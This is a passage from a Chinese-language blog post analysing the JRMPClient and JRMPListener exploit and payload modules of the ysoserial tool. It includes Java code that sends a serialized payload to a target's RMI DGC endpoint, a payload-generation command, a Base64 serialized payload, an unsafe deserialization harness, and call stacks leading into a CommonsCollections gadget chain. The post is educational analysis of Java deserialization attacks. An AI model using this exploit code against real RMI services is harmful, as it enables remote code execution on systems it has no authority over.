class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入目标RMI注册端（也是DGC服务端）的IP端口，以及攻击载荷的payload对象。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">makeDGCCall</span> <span class="params">( String hostname, <span class="type">int</span> port, Object payloadObject )</span> <span class="keyword">throws</span> IOException, UnknownHostException, SocketException &#123;</span><br><span class="line">        <span class="type">InetSocketAddress</span> <span class="variable">isa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(hostname, port);</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">DataOutputStream</span> <span class="variable">dos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//建立一个socket通道，并为赋值</span></span><br><span class="line">            s = SocketFactory.getDefault().createSocket(hostname, port);</span><br><span class="line">            s.setKeepAlive(<span class="literal">true</span>);</span><br><span class="line">            s.setTcpNoDelay(<span class="literal">true</span>);</span><br><span class="line">           <span class="comment">//读取socket通道的数据流</span></span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> s.getOutputStream();</span><br><span class="line">            dos = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(os);</span><br><span class="line">           <span class="comment">//*******开始拼接数据流*********</span></span><br><span class="line">            <span class="comment">//以下均为特定协议格式常量，之后会说到这些数据是怎么来的</span></span><br><span class="line">            <span class="comment">//传输魔术字符：0x4a524d49（代表协议）</span></span><br><span class="line">            dos.writeInt(TransportConstants.Magic);</span><br><span class="line">            <span class="comment">//传输协议版本号：2（就是版本号）</span></span><br><span class="line">            dos.writeShort(TransportConstants.Version);</span><br><span class="line">            <span class="comment">//传输协议类型: 0x4c (协议的种类，好像是单向传输数据，不需要TCP的ACK确认)</span></span><br><span class="line">            dos.writeByte(TransportConstants.SingleOpProtocol);</span><br><span class="line">           <span class="comment">//传输指令-RMI call：0x50 </span></span><br><span class="line">            dos.write(TransportConstants.Call);</span><br><span class="line"></span><br><span class="line">            <span class="meta">@SuppressWarnings</span> ( <span class="string">&quot;resource&quot;</span> )</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MarshalOutputStream</span>(dos);</span><br><span class="line">           <span class="comment">//DGC的固定读取格式，等会具体分析</span></span><br><span class="line">            objOut.writeLong(<span class="number">2</span>); <span class="comment">// DGC</span></span><br><span class="line">            objOut.writeInt(<span class="number">0</span>);</span><br><span class="line">            objOut.writeLong(<span class="number">0</span>);</span><br><span class="line">            objOut.writeShort(<span class="number">0</span>);</span><br><span class="line">           <span class="comment">//选取DGC服务端的分支选dirty</span></span><br><span class="line">            objOut.writeInt(<span class="number">1</span>); <span class="comment">// dirty</span></span><br><span class="line">            <span class="comment">//然后一个固定的hash值</span></span><br><span class="line">            objOut.writeLong(-<span class="number">669196253586618813L</span>);</span><br><span class="line">            <span class="comment">//我们的反序列化触发点</span></span><br><span class="line">            objOut.writeObject(payloadObject);</span><br><span class="line"></span><br><span class="line">            os.flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>具体参考RMI反序列化部分的DGC攻击即可，在我们运行之后受害者端会走到一个dispatch方法中</p>
<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614185548393.png" class="">

<p>dgc服务端会走到dispatch这个方法中</p>
<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614185834167.png" class="">

<p>继续走到oldDispatch方法中</p>
<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614190030449.png" class="">

<p>这里会继续走到服务端的dispatch中</p>
<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614190119315.png" class="">

<p>这里会走到这里进行反序列化</p>
<h2 id="payload模块"><a href="#payload模块" class="headerlink" title="payload模块"></a>payload模块</h2><h3 id="JRMPListener"><a href="#JRMPListener" class="headerlink" title="JRMPListener"></a>JRMPListener</h3><p>这个payloda模块的原理其实就是如果存在一个反序列化的数据是我们可以控制的，那么这个模块生成的序列化数据传入进去反序列化之后会在受害者端开启一个rmi服务，此时我们在像该端口传入恶意的序列化数据即可达成攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar ysoserial.payloads.JRMPListener  1099  | base64</span><br></pre></td></tr></table></figure>

<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614190643946.png" class="">

<p>这是用法，如果要分析原理可以写一个功能去反序列化这段数据跟踪调用过程就能发现就是在被控端开了一个rmi服务。然后在配合着Exploit模块的JRMPClient进行攻击</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean.zbz;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeUtil</span> &#123;  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * 将Base64编码的序列化字符串解码并反序列化为Java对象。  </span></span><br><span class="line"><span class="comment">     *  </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> base64EncodedObject Base64编码的序列化对象字符串。  </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> &lt;T&gt;                 要反序列化的对象类型。  </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 成功反序列化后的对象，如果解码或反序列化失败则返回 null。  </span></span><br><span class="line"><span class="comment">     */</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserializeFromBase64</span><span class="params">(String base64EncodedObject)</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (base64EncodedObject == <span class="literal">null</span> || base64EncodedObject.isEmpty()) &#123;  </span><br><span class="line">            System.err.println(<span class="string">&quot;错误：Base64 编码的字符串不能为空。&quot;</span>);  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 步骤1：Base64 解码  </span></span><br><span class="line">            <span class="type">byte</span>[] decodedBytes = Base64.getDecoder().decode(base64EncodedObject);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 步骤2：反序列化字节数组为对象  </span></span><br><span class="line">            <span class="keyword">try</span> (<span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decodedBytes);  </span><br><span class="line">                 <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis)) &#123;  </span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span> <span class="comment">// 编译器警告：类型转换是安全的，因为我们期望的是一个对象  </span></span><br><span class="line">                <span class="type">T</span> <span class="variable">deserializedObject</span> <span class="operator">=</span> (T) ois.readObject();  </span><br><span class="line">                <span class="keyword">return</span> deserializedObject;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;  </span><br><span class="line">            System.err.println(<span class="string">&quot;Base64 解码失败：无效的 Base64 字符串。&quot;</span>);  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            System.err.println(<span class="string">&quot;反序列化 IO 错误：&quot;</span> + e.getMessage());  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;  </span><br><span class="line">            System.err.println(<span class="string">&quot;反序列化失败：找不到对应的类。请确保目标类在 classpath 中。&quot;</span>);  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException e) &#123;  </span><br><span class="line">            System.err.println(<span class="string">&quot;反序列化类型转换失败：对象类型不匹配。&quot;</span>);  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">myBase64String</span> <span class="operator">=</span> <span class="string">&quot;rO0ABXNyACJzdW4ucm1pLnNlcnZlci5BY3RpdmF0aW9uR3JvdXBJbXBsT+r9SAwuMqcCAARaAA1ncm91cEluYWN0aXZlTAAGYWN0aXZldAAVTGphdmEvdXRpbC9IYXNodGFibGU7TAAHZ3JvdXBJRHQAJ0xqYXZhL3JtaS9hY3RpdmF0aW9uL0FjdGl2YXRpb25Hcm91cElEO0wACWxvY2tlZElEc3QAEExqYXZhL3V0aWwvTGlzdDt4cgAjamF2YS5ybWkuYWN0aXZhdGlvbi5BY3RpdmF0aW9uR3JvdXCVLvKwBSnVVAIAA0oAC2luY2FybmF0aW9uTAAHZ3JvdXBJRHEAfgACTAAHbW9uaXRvcnQAJ0xqYXZhL3JtaS9hY3RpdmF0aW9uL0FjdGl2YXRpb25Nb25pdG9yO3hyACNqYXZhLnJtaS5zZXJ2ZXIuVW5pY2FzdFJlbW90ZU9iamVjdEUJEhX14n4xAgADSQAEcG9ydEwAA2NzZnQAKExqYXZhL3JtaS9zZXJ2ZXIvUk1JQ2xpZW50U29ja2V0RmFjdG9yeTtMAANzc2Z0AChMamF2YS9ybWkvc2VydmVyL1JNSVNlcnZlclNvY2tldEZhY3Rvcnk7eHIAHGphdmEucm1pLnNlcnZlci5SZW1vdGVTZXJ2ZXLHGQcSaPM5+wIAAHhyABxqYXZhLnJtaS5zZXJ2ZXIuUmVtb3RlT2JqZWN002G0kQxhMx4DAAB4cHcSABBVbmljYXN0U2VydmVyUmVmeAAABEtwcAAAAAAAAAAAcHAAcHBw&quot;</span>; <span class="comment">// 这是一个示例 Base64 字符串  </span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> SerializeUtil.deserializeFromBase64(myBase64String);  </span><br><span class="line">        System.out.println(o);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后跟一下</p>
<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614232648217.png" class="">

<p>会走到<code>UnicastRemoteObject</code>类的ReadObject方法中，然后继续调用reexport()方法</p>
<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614232827561.png" class="">

<p>这里就和前面分析rmi的流程很像就是创建一个服务</p>
<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614232903153.png" class="">

<p>直接贴调用栈</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">readObject:<span class="number">297</span>, HashSet (java.util)  </span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)  </span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)  </span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)  </span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)  </span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)  </span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)  </span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)  </span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)  </span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)  </span><br><span class="line">dispatch:-<span class="number">1</span>, DGCImpl_Skel (sun.rmi.transport)  </span><br><span class="line">oldDispatch:<span class="number">410</span>, UnicastServerRef (sun.rmi.server)  </span><br><span class="line">dispatch:<span class="number">268</span>, UnicastServerRef (sun.rmi.server)  </span><br><span class="line">run:<span class="number">200</span>, Transport$<span class="number">1</span> (sun.rmi.transport)  </span><br><span class="line">run:<span class="number">197</span>, Transport$<span class="number">1</span> (sun.rmi.transport)  </span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)  </span><br><span class="line">serviceCall:<span class="number">196</span>, Transport (sun.rmi.transport)  </span><br><span class="line">handleMessages:<span class="number">568</span>, TCPTransport (sun.rmi.transport.tcp)  </span><br><span class="line">run0:<span class="number">790</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)  </span><br><span class="line">lambda$run$<span class="number">256</span>:<span class="number">683</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)  </span><br><span class="line">run:-<span class="number">1</span>, <span class="number">1052690258</span> (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$<span class="number">1</span>)  </span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)  </span><br><span class="line">run:<span class="number">682</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)  </span><br><span class="line">runWorker:<span class="number">1142</span>, ThreadPoolExecutor (java.util.concurrent)  </span><br><span class="line">run:<span class="number">617</span>, ThreadPoolExecutor$Worker (java.util.concurrent)  </span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>原理就是上面说的开启rmi服务，然后我们在攻击服务端的DGC。</p>
<h3 id="JRMPClient-1"><a href="#JRMPClient-1" class="headerlink" title="JRMPClient"></a>JRMPClient</h3><p>这个链子的原理就是找到我们可以控制反序列化的点传入数据，然后受害端会去连接我们恶意的rmi服务端，返回恶意的序列化数据从而造成漏洞。</p>
<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614234311221.png" class="">

<p>在反序列化这段数据之后，会走到DGC的dirty方法中</p>
<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614234246292.png" class="">

<p>然后继续通过newCall向我们的恶意端发送请求</p>
<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614234655028.png" class="">

<p>然后恶意端给返回恶意的序列化数据</p>
<img src="/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/20250614234911339.png" class="">

<p>在贴一下调用栈</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">getRuntime:<span class="number">58</span>, Runtime (java.lang)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">transform:<span class="number">126</span>, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:<span class="number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">158</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:<span class="number">74</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:<span class="number">121</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">334</span>, HashSet (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">access$<span class="number">300</span>:<span class="number">206</span>, ObjectInputStream (java.io)</span><br><span class="line">readFields:<span class="number">2164</span>, ObjectInputStream$GetFieldImpl (java.io)</span><br><span class="line">readFields:<span class="number">541</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">71</span>, BadAttributeValueExpException (javax.management)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">executeCall:<span class="number">245</span>, StreamRemoteCall (sun.rmi.transport)</span><br><span class="line">invoke:<span class="number">379</span>, UnicastRef (sun.rmi.server)</span><br><span class="line">dirty:-<span class="number">1</span>, DGCImpl_Stub (sun.rmi.transport)</span><br><span class="line">makeDirtyCall:<span class="number">378</span>, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:<span class="number">320</span>, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:<span class="number">156</span>, DGCClient (sun.rmi.transport)</span><br><span class="line">read:<span class="number">312</span>, LiveRef (sun.rmi.transport)</span><br><span class="line">readExternal:<span class="number">493</span>, UnicastRef (sun.rmi.server)</span><br><span class="line">readObject:<span class="number">455</span>, RemoteObject (java.rmi.server)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:<span class="number">2000</span>, ObjectInputStream (java.io)</span><br><span class="line">readSerialData:<span class="number">1924</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">deserializeFromBase64:<span class="number">27</span>, SerializeUtil (com.ocean.zbz)</span><br><span class="line">main:<span class="number">47</span>, SerializeUtil (com.ocean.zbz)</span><br></pre></td></tr></table></figure>


  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/link/">Friends</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit%E6%A8%A1%E5%9D%97"><span class="toc-number">4.</span> <span class="toc-text">Exploit模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JRMPListenr"><span class="toc-number">4.1.</span> <span class="toc-text">JRMPListenr</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">4.1.1.</span> <span class="toc-text">原理分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JRMPClient"><span class="toc-number">4.2.</span> <span class="toc-text">JRMPClient</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload%E6%A8%A1%E5%9D%97"><span class="toc-number">5.</span> <span class="toc-text">payload模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JRMPListener"><span class="toc-number">5.1.</span> <span class="toc-text">JRMPListener</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JRMPClient-1"><span class="toc-number">5.2.</span> <span class="toc-text">JRMPClient</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&text=Ysoserial-JRMP模块"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&title=Ysoserial-JRMP模块"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&is_video=false&description=Ysoserial-JRMP模块"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Ysoserial-JRMP模块&body=Check out this article: https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&title=Ysoserial-JRMP模块"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&title=Ysoserial-JRMP模块"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&title=Ysoserial-JRMP模块"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&title=Ysoserial-JRMP模块"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/06/14/Java%E5%AE%89%E5%85%A8/Ysoserial-JRMP%E6%A8%A1%E5%9D%97/&name=Ysoserial-JRMP模块&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
